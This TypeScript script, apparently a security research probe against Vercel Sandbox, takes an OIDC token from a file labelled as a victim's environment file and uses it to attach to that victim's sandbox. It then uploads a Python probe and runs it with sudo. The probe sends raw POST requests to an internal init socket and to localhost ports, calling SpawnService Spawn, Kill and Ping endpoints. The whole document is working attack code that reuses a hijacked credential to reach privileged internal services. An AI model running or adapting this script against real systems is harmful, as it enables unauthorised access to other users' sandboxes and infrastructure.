import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const PY = String.raw`
import socket, os, sys
CRLF = "\r\n"
def send(target, path, body="{}"):
    try:
        if target.startswith("unix:"):
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(target[5:])
        else:
            host, port = target.split(":")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, int(port)))
        req = "POST %s HTTP/1.1%sHost: localhost%sContent-Type: application/json%sContent-Length: %d%s%s%s" % (path, CRLF, CRLF, CRLF, len(body), CRLF, CRLF, body)
        s.sendall(req.encode())
        data = b""
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        print("--- %s %s ---" % (target, path))
        print(data[:4000])
        s.close()
    except Exception as e:
        print("--- %s %s --- ERR %s" % (target, path, e))

targets = ["unix:/run/vercel/share/init.sock", "127.0.0.1:23456", "127.0.0.1:30001", "127.0.0.1:30002"]
paths = ["/vercel.sandbox.spawn.v1.SpawnService/Ping",
         "/vercel.sandbox.spawn.v1.SpawnService/Spawn",
         "/vercel.sandbox.spawn.v1.SpawnService/",
         "/vercel.sandbox.spawn.v1.SpawnService/Kill",
         "/grpc.health.v1.Health/Check"]
for t in targets:
    for p in paths:
        send(t, p)
print("PROBE DONE")
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  await sbx.writeFiles([{ path: "/tmp/probe.py", content: Buffer.from(PY) }]);
  const res = await sbx.runCommand("python3", ["/tmp/probe.py"], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });